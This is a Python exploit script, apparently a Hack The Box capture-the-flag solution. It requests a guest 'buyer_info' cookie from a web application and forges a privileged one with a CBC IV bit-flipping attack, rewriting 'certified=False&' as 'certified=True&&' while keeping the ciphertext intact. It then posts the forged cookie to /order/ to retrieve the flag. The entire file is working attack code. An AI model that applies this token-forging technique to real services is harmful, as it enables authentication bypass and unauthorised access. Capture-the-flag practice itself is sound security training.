#!/usr/bin/env python3
import http.client
import re
import sys
from base64 import b64decode, b64encode

# The guest cookie is b64(plaintext) "." b64(iv + AES-CBC(plaintext)). The server
# checks the cookie by re-encrypting the plaintext with the IV from the cookie and
# comparing the whole result. Changing the IV therefore changes the first plaintext
# block in CBC, and the ciphertext blocks stay the same. The first 16 bytes of the
# plaintext are "certified=False&", so the IV is XORed with the difference to turn
# that into "certified=True&&" (same length, parsed as certified=True).

BLOCK = 16
GUEST_PREFIX = b"certified=False&"
TARGET_PREFIX = b"certified=True&&"


def get_guest_cookie(base_host, port):
    conn = http.client.HTTPConnection(base_host, int(port), timeout=10)
    conn.request("GET", "/")
    resp = conn.getresponse()
    resp.read()
    conn.close()
    for name, value in resp.getheaders():
        if name.lower() == "set-cookie" and value.startswith("buyer_info="):
            return value.split(";", 1)[0].split("=", 1)[1]
    raise SystemExit("[!] No buyer_info cookie in response")


def forge(cookie):
    plain_b64, crypto_b64 = cookie.split(".")
    plain = b64decode(plain_b64)
    segment = b64decode(crypto_b64)
    iv, ciphertext = segment[:BLOCK], segment[BLOCK:]

    if plain[:BLOCK] != GUEST_PREFIX:
        raise SystemExit(f"[!] Unexpected first block: {plain[:BLOCK]!r}")

    new_iv = bytes(
        a ^ b ^ c for a, b, c in zip(iv, GUEST_PREFIX, TARGET_PREFIX))
    forged_plain = b64encode(TARGET_PREFIX + plain[BLOCK:]).decode()
    forged_segment = b64encode(new_iv + ciphertext).decode()
    return f"{forged_plain}.{forged_segment}"


def get_order_page(host, port, cookie):
    conn = http.client.HTTPConnection(host, int(port), timeout=10)
    conn.request("POST", "/order/", headers={"Cookie": f"buyer_info={cookie}"})
    resp = conn.getresponse()
    body = resp.read().decode(errors="replace")
    conn.close()
    return resp.status, body


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        sys.exit(1)

    host, port = sys.argv[1], sys.argv[2]
    cookie = get_guest_cookie(host, port)
    forged = forge(cookie)

    status, body = get_order_page(host, port, forged)
    flag = re.search(r"HTB\{[^}]+\}", body)
    if status != 200 or not flag:
        raise SystemExit(f"[!] No flag (status {status})")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    main()
